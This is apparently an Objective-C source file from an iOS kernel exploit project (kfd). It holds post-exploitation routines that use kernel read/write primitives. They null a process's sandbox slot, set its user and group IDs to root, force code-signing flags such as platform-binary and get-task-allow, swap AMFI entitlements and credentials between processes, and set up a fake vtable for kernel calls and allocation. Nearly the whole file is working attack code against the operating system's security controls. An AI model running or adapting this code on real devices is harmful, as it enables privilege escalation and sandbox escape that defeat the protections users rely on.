//
//  fun.m
//  kfd
//
//  Created by Seo Hyun-gyu on 2023/08/10.
//

#import <Foundation/Foundation.h>
#import <mach/mach.h>
#import <spawn.h>
#import <sys/stat.h>
#import "krw.h"
#import "offsets.h"
#import "amfi.h"


void HexDump(uint64_t addr, size_t size) {
    void *data = malloc(size);
    kreadbuf(addr, data, size);
    char ascii[17];
    size_t i, j;
    ascii[16] = '\0';
    for (i = 0; i < size; ++i) {
        if ((i % 16) == 0)
        {
            printf("[0x%016llx+0x%03zx] ", addr, i);
//            printf("[0x%016llx] ", i + addr);
        }
        
        printf("%02X ", ((unsigned char*)data)[i]);
        if (((unsigned char*)data)[i] >= ' ' && ((unsigned char*)data)[i] <= '~') {
            ascii[i % 16] = ((unsigned char*)data)[i];
        } else {
            ascii[i % 16] = '.';
        }
        if ((i+1) % 8 == 0 || i+1 == size) {
            printf(" ");
            if ((i+1) % 16 == 0) {
                printf("|  %s \n", ascii);
            } else if (i+1 == size) {
                ascii[(i+1) % 16] = '\0';
                if ((i+1) % 16 <= 8) {
                    printf(" ");
                }
                for (j = (i+1) % 16; j < 16; ++j) {
                    printf("   ");
                }
                printf("|  %s \n", ascii);
            }
        }
    }
    free(data);
}

uint64_t proc_of_pid(pid_t pid) {
    uint64_t proc = get_kernproc();
    
    while (true) {
        if(kread32(proc + off_p_pid) == pid) {
            return proc;
        }
        proc = kread64(proc + off_p_list_le_prev);
        if(!proc) {
            return -1;
        }
    }
    
    return 0;
}

uint64_t proc_by_name(char* nm) {
    uint64_t proc = get_kernproc();
    
    while (true) {
        uint64_t nameptr = proc + off_p_name;
        char name[32];
        do_kread(nameptr, &name, 32);
//        printf("[i] pid: %d, process name: %s\n", kread32(proc + off_p_pid), name);
        if(strcmp(name, nm) == 0) {
            return proc;
        }
        proc = kread64(proc + off_p_list_le_prev);
        if(!proc) {
            return -1;
        }
    }
    
    return 0;
}

pid_t pid_by_name(char* nm) {
    uint64_t proc = proc_by_name(nm);
    if(proc == -1) return -1;
    return kread32(proc + off_p_pid);
}

uint64_t unsandbox(pid_t pid) {
    printf("[*] Unsandboxing pid %d\n", pid);
    
    uint64_t proc = proc_of_pid(pid); // pid's proccess structure on the kernel
    uint64_t ucred = kread64(proc + off_p_ucred); // pid credentials
    uint64_t cr_label = kread64(ucred + off_u_cr_label); // MAC label
    uint64_t orig_sb = kread64(cr_label + off_sandbox_slot);
    
    kwrite64(cr_label + off_sandbox_slot /* First slot is AMFI's. so, this is second? */, 0); //get rid of sandbox by nullifying it
    
    return (kread64(kread64(ucred + off_u_cr_label) + off_sandbox_slot) == 0) ? orig_sb : NO;
}

BOOL sandbox(pid_t pid, uint64_t sb) {
    if (!pid) return NO;
    
    printf("[*] Sandboxing pid %d with slot at 0x%llx\n", pid, sb);
    
    uint64_t proc = proc_of_pid(pid); // pid's proccess structure on the kernel
    uint64_t ucred = kread64(proc + off_p_ucred); // pid credentials
    uint64_t cr_label = kread64(ucred + off_u_cr_label); /* MAC label */
    kwrite64(cr_label + off_sandbox_slot /* First slot is AMFI's. so, this is second? */, sb);
    
    return (kread64(kread64(ucred + off_u_cr_label) + off_sandbox_slot) == sb) ? YES : NO;
}

BOOL rootify(pid_t pid) {
    if (!pid) return NO;

    uint64_t proc = proc_of_pid(pid);
    uint64_t ucred = kread64(proc + off_p_ucred);
    
    //make everything 0 without setuid(0), pretty straightforward.
    kwrite32(proc + off_p_uid, 0);
    kwrite32(proc + off_p_ruid, 0);
    kwrite32(proc + off_p_gid, 0);
    kwrite32(proc + off_p_rgid, 0);
    kwrite32(ucred + off_u_cr_uid, 0);
    kwrite32(ucred + off_u_cr_ruid, 0);
    kwrite32(ucred + off_u_cr_svuid, 0);
    kwrite32(ucred + off_u_cr_ngroups, 1);
    kwrite32(ucred + off_u_cr_groups, 0);
    kwrite32(ucred + off_u_cr_rgid, 0);
    kwrite32(ucred + off_u_cr_svgid, 0);

    return (kread32(proc + off_p_uid) == 0) ? YES : NO;
    return NO;
}

bool set_task_platform(pid_t pid, bool set) {
    uint64_t proc = proc_of_pid(pid);
    uint64_t task = kread64(proc + off_p_task);
    uint32_t t_flags = kread32(task + off_task_t_flags);
    
    if (set) {
        t_flags |= TF_PLATFORM;
    } else {
        t_flags &= ~(TF_PLATFORM);
    }
    
    kwrite32(task + off_task_t_flags, t_flags);
    
    return true;
}

void set_proc_csflags(pid_t pid) {
    uint64_t proc = proc_of_pid(pid);
    
    uint32_t csflags = kread32(proc + off_p_csflags);
    csflags = csflags | CS_DEBUGGED | CS_PLATFORM_BINARY | CS_INSTALLER | CS_GET_TASK_ALLOW;
    csflags &= ~(CS_RESTRICT | CS_HARD | CS_KILL);
    kwrite32(proc + off_p_csflags, csflags);
}

uint64_t get_cs_blob(pid_t pid) {
    uint64_t proc = proc_of_pid(pid);
    uint64_t textvp = kread64(proc + off_p_textvp);
    uint64_t ubcinfo = kread64(textvp + off_vnode_vu_ubcinfo);
    return kread64(ubcinfo + off_ubc_info_cs_blobs);
}

void set_csb_platform_binary(pid_t pid) {
    uint64_t cs_blob = get_cs_blob(pid);
    kwrite32(cs_blob + off_cs_blob_csb_platform_binary, 1);
}

uint64_t borrow_entitlements(pid_t to_pid, pid_t from_pid) {
    uint64_t to_proc = proc_of_pid(to_pid);
    uint64_t from_proc = proc_of_pid(from_pid);
    
    uint64_t to_ucred = kread64(to_proc + off_p_ucred);
    uint64_t from_ucred = kread64(from_proc + off_p_ucred);
    
    uint64_t to_cr_label = kread64(to_ucred + off_u_cr_label);
    uint64_t from_cr_label = kread64(from_ucred + off_u_cr_label);
    
    uint64_t to_amfi = kread64(to_cr_label + off_amfi_slot);
    uint64_t from_amfi = kread64(from_cr_label + off_amfi_slot);
    
    kwrite64(to_cr_label + off_amfi_slot, from_amfi);
    
    return to_amfi;
}

void unborrow_entitlements(uint64_t to_pid, uint64_t to_amfi) {
    uint64_t to_proc = proc_of_pid(to_pid);
    uint64_t to_ucred = kread64(to_proc + 0xd8);
    uint64_t to_cr_label = kread64(to_ucred + off_u_cr_label);
    
    kwrite64(to_cr_label + off_amfi_slot, to_amfi);
}

uint64_t borrow_ucreds(pid_t to_pid, pid_t from_pid) {
    uint64_t to_proc = proc_of_pid(to_pid);
    uint64_t from_proc = proc_of_pid(from_pid);
    
    uint64_t to_ucred = kread64(to_proc + off_p_ucred);
    uint64_t from_ucred = kread64(from_proc + off_p_ucred);
    
    kwrite64(to_proc + off_p_ucred, from_ucred);
    
    return to_ucred;
}

void unborrow_ucreds(pid_t to_pid, uint64_t to_ucred) {
    uint64_t to_proc = proc_of_pid(to_pid);
    
    kwrite64(to_proc + off_p_ucred, to_ucred);
}

extern char **environ;

uint64_t run_borrow_entitlements(pid_t to_pid, char* from_path) {
    posix_spawnattr_t attrp;
    posix_spawnattr_init(&attrp);
    posix_spawnattr_setflags(&attrp, POSIX_SPAWN_START_SUSPENDED);
    
    NSString *from_path_ns = [NSString stringWithUTF8String:from_path];
    char *last_process = [[from_path_ns componentsSeparatedByString:@"/"] lastObject].UTF8String;
    
    pid_t from_pid;
    const char *argv[] = {last_process, NULL};
    int retVal = posix_spawn(&from_pid, from_path, NULL, &attrp, (char* const*)argv, environ);
    if(retVal < 0) {
        printf("Couldn't posix_spawn.\n");
        return -1;
    }
    
    uint64_t to_proc = proc_of_pid(to_pid);
    uint64_t from_proc = proc_of_pid(from_pid);
    
    uint64_t to_ucred = kread64(to_proc + off_p_ucred);
    uint64_t from_ucred = kread64(from_proc + off_p_ucred);
    
    uint64_t to_cr_label = kread64(to_ucred + off_u_cr_label);
    uint64_t from_cr_label = kread64(from_ucred + off_u_cr_label);
    
    uint64_t to_amfi = kread64(to_cr_label + off_amfi_slot);
    uint64_t from_amfi = kread64(from_cr_label + off_amfi_slot);
    
    kwrite64(to_cr_label + off_amfi_slot, from_amfi);
    
    return to_amfi;
}

void kill_unborrow_entitlements(pid_t to_pid, uint64_t to_amfi, pid_t kill_pid) {
    uint64_t to_proc = proc_of_pid(to_pid);
    uint64_t to_ucred = kread64(to_proc + 0xd8);
    uint64_t to_cr_label = kread64(to_ucred + off_u_cr_label);
    
    kwrite64(to_cr_label + off_amfi_slot, to_amfi);
    
    kill(kill_pid, SIGKILL);
}

static int runCommandv(const char *cmd, int argc, const char * const* argv, void (^unrestrict)(pid_t))
{
    pid_t pid;
    posix_spawn_file_actions_t *actions = NULL;
    posix_spawn_file_actions_t actionsStruct;
    int out_pipe[2];
    bool valid_pipe = false;
    posix_spawnattr_t *attr = NULL;
    posix_spawnattr_t attrStruct;

    valid_pipe = pipe(out_pipe) == 0;
    if (valid_pipe && posix_spawn_file_actions_init(&actionsStruct) == 0) {
        actions = &actionsStruct;
        posix_spawn_file_actions_adddup2(actions, out_pipe[1], 1);
        posix_spawn_file_actions_adddup2(actions, out_pipe[1], 2);
        posix_spawn_file_actions_addclose(actions, out_pipe[0]);
        posix_spawn_file_actions_addclose(actions, out_pipe[1]);
    }

    if (unrestrict && posix_spawnattr_init(&attrStruct) == 0) {
        attr = &attrStruct;
        posix_spawnattr_setflags(attr, POSIX_SPAWN_START_SUSPENDED);
    }

    int rv = posix_spawn(&pid, cmd, actions, attr, (char *const *)argv, environ);

    if (unrestrict) {
        unrestrict(pid);
        kill(pid, SIGCONT);
    }

    if (valid_pipe) {
        close(out_pipe[1]);
    }

    if (rv == 0) {
        if (valid_pipe) {
            char buf[256];
            ssize_t len;
            while (1) {
                len = read(out_pipe[0], buf, sizeof(buf) - 1);
                if (len == 0) {
                    break;
                }
                else if (len == -1) {
                    perror("posix_spawn, read pipe\n");
                }
                buf[len] = 0;
                printf("%s\n", buf);
            }
        }
        if (waitpid(pid, &rv, 0) == -1) {
            printf("ERROR: Waitpid failed\n");
        } else {
            printf("%s(%d) completed with exit status %d\n", __FUNCTION__, pid, WEXITSTATUS(rv));
        }

    } else {
        printf("%s(%d): ERROR posix_spawn failed (%d): %s\n", __FUNCTION__, pid, rv, strerror(rv));
        rv <<= 8; // Put error into WEXITSTATUS
    }
    if (valid_pipe) {
        close(out_pipe[0]);
    }
    return rv;
}

int util_runCommand(const char *cmd, ...)
{
    va_list ap, ap2;
    int argc = 1;

    va_start(ap, cmd);
    va_copy(ap2, ap);

    while (va_arg(ap, const char *) != NULL) {
        argc++;
    }
    va_end(ap);

    const char *argv[argc+1];
    argv[0] = cmd;
    for (int i=1; i<argc; i++) {
        argv[i] = va_arg(ap2, const char *);
    }
    va_end(ap2);
    argv[argc] = NULL;

    int rv = runCommandv(cmd, argc, argv, NULL);
    return WEXITSTATUS(rv);
}

uint64_t ipc_entry_lookup(mach_port_t port_name)
{
    uint64_t proc = proc_of_pid(getpid());
    uint64_t task = kread64(proc + off_p_task);
    uint64_t itk_space = kread64(task + 0x330);//g_exp.self_ipc_space;
    //uint32_t table_size = kread32(itk_space + 0x14);//OFFSET(ipc_space, is_table_size));
    uint32_t port_index = MACH_PORT_INDEX(port_name);
    uint64_t is_table = kread64(itk_space + 0x20);//OFFSET(ipc_space, is_table));
    uint64_t entry = is_table + port_index * 0x18;//SIZE(ipc_entry);
    return entry;
}

uint64_t port_name_to_ipc_port(mach_port_t port_name)
{
    uint64_t entry = ipc_entry_lookup(port_name);
    uint64_t ipc_port = kread64(entry + 0x0);
    return ipc_port;
}

uint64_t port_name_to_kobject(mach_port_t port_name)
{
    uint64_t ipc_port = port_name_to_ipc_port(port_name);
    uint64_t kobject = kread64(ipc_port + 0x58);//OFFSET(ipc_port, ip_kobject));
    return kobject;
}

uint64_t findRootVnode(void) {
    uint64_t launchd_proc = proc_of_pid(1);
    
    uint64_t textvp_pac = kread64(launchd_proc + off_p_textvp);
    uint64_t textvp = textvp_pac | 0xffffff8000000000;
    printf("[i] launchd proc->textvp: 0x%llx\n", textvp);

    uint64_t textvp_nameptr = kread64(textvp + off_vnode_v_name);
    uint64_t textvp_name = kread64(textvp_nameptr);
    printf("[i] launchd proc->textvp->v_name: %s\n", &textvp_name);
    
    uint64_t sbin_vnode = kread64(textvp + off_vnode_v_parent) | 0xffffff8000000000;
    textvp_nameptr = kread64(sbin_vnode + off_vnode_v_name);
    textvp_name = kread64(textvp_nameptr);
    printf("[i] launchd proc->textvp->v_parent->v_name: %s\n", &textvp_name);
    
    uint64_t root_vnode = kread64(sbin_vnode + off_vnode_v_parent) | 0xffffff8000000000;
    textvp_nameptr = kread64(root_vnode + off_vnode_v_name);
    textvp_name = kread64(textvp_nameptr);
    printf("[i] launchd proc->textvp->v_parent->v_parent->v_name: %s\n", &textvp_name);
    printf("[+] rootvnode: 0x%llx\n", root_vnode);
    
    return root_vnode;
}

int save_for_kcall(uint64_t fake_vtable, uint64_t fake_client) {
    NSDictionary *dictionary = @{
        @"kcall_fake_vtable": @(fake_vtable),
        @"kcall_fake_client": @(fake_client)
    };
    
    BOOL success = [dictionary writeToFile:@"tmp/kfd-arm64.plist" atomically:YES];
    if (!success) {
        printf("[-] Failed createPlistAtPath.\n");
        return -1;
    }
    
    return 0;
}


int do_fun(void) {
    _offsets_init();
    
    uint64_t kslide = get_kslide();
    uint64_t kbase = 0xfffffff007004000 + kslide;
    
    printf("[i] Kernel base: 0x%llx\n", kbase);
    printf("[i] Kernel slide: 0x%llx\n", kslide);
    uint64_t kheader64 = kread64(kbase);
    printf("[i] Kernel base kread64 ret: 0x%llx\n", kheader64);
    
    printf("[i] rootify ret: %d\n", rootify(getpid()));
    printf("[i] uid: %d, gid: %d\n", getuid(), getgid());
    
//    uint64_t sb = unsandbox(getpid());
//    printf("[i] our_sandbox: 0x%llx\n", sb);
    
    uint64_t fake_vtable, fake_client = 0;
    if(access("/tmp/kfd-arm64.plist", F_OK) == 0) {
        uint64_t sb = unsandbox(getpid());
        NSDictionary *kcalltest14_dict = [NSDictionary dictionaryWithContentsOfFile:@"/tmp/kfd-arm64.plist"];
        fake_vtable = [kcalltest14_dict[@"kcall_fake_vtable"] unsignedLongLongValue];
        fake_client = [kcalltest14_dict[@"kcall_fake_client"] unsignedLongLongValue];
        sandbox(getpid(), sb);
    } else {
        kalloc_using_empty_kdata_page(&fake_vtable, &fake_client);
        
        //Once if you successfully get kalloc to use fake_vtable and fake_client,
        //DO NOT use dirty_kalloc again since unstable method.
        uint64_t sb = unsandbox(getpid());
        save_for_kcall(fake_vtable, fake_client);
        sandbox(getpid(), sb);
        printf("Saved fake_vtable, fake_client for kcall.\n");
        printf("fake_vtable: 0x%llx, fake_client: 0x%llx\n", fake_vtable, fake_client);
    }
    
    mach_port_t user_client = 0;
    init_kcall_allocated(fake_vtable, fake_client, &user_client);
    
    size_t allocated_size = 0x1000;
    uint64_t allocated_kmem = kalloc(user_client, fake_client, allocated_size);
    kwrite64(allocated_kmem, 0x4142434445464748);
    printf("allocated_kmem: 0x%llx\n", allocated_kmem);
    HexDump(allocated_kmem, allocated_size);
    
    kfree(user_client, fake_client, allocated_kmem, allocated_size);
    
    return 0;
}
